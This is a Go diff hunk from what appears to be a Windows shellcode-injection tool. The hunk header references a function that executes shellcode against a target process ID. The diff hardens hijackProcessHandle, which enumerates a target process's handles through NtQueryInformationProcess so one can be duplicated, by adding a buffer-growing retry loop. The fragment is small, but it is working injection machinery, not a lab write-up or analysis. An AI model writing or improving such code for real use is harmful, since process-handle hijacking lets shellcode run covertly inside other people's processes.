@@ -430,30 +430,45 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 
 // hijackProcessHandle enumerates handles in target process and duplicates one of the specified type
 func hijackProcessHandle(hProcess windows.Handle, objectType string, desiredAccess uint32) (windows.Handle, error) {
-	// First call to get required buffer size
+	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
+	const maxRetries = 5
+
+	// Start with a reasonable initial buffer size and retry with increasing sizes
+	var buffer []byte
 	var returnLength uint32
-	status, _, _ := procNtQueryInformationProcess.Call(
-		uintptr(hProcess),
-		uintptr(ProcessHandleInformation),
-		0,
-		0,
-		uintptr(unsafe.Pointer(&returnLength)),
-	)
+	bufferSize := uint32(64 * 1024) // Start with 64KB
 
-	// Allocate buffer (add extra space for safety)
-	bufferSize := returnLength + 4096
-	buffer := make([]byte, bufferSize)
+	var status uintptr
+	for i := 0; i < maxRetries; i++ {
+		buffer = make([]byte, bufferSize)
+		status, _, _ = procNtQueryInformationProcess.Call(
+			uintptr(hProcess),
+			uintptr(ProcessHandleInformation),
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(bufferSize),
+			uintptr(unsafe.Pointer(&returnLength)),
+		)
 
-	// Query handle information
-	status, _, _ = procNtQueryInformationProcess.Call(
-		uintptr(hProcess),
-		uintptr(ProcessHandleInformation),
-		uintptr(unsafe.Pointer(&buffer[0])),
-		uintptr(bufferSize),
-		uintptr(unsafe.Pointer(&returnLength)),
-	)
-	if status != 0 {
+		if status == 0 {
+			break // Success
+		}
+
+		if status == STATUS_INFO_LENGTH_MISMATCH {
+			// Double the buffer size for next attempt, or use returnLength if provided
+			if returnLength > bufferSize {
+				bufferSize = returnLength + 4096
+			} else {
+				bufferSize *= 2
+			}
+			continue
+		}
+
+		// Some other error
 		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
+	}
+
+	if status != 0 {
+		return 0, fmt.Errorf("NtQueryInformationProcess failed after %d retries: 0x%X (buffer size: %d)", maxRetries, status, bufferSize)
 	}
 
 	// Parse handle information
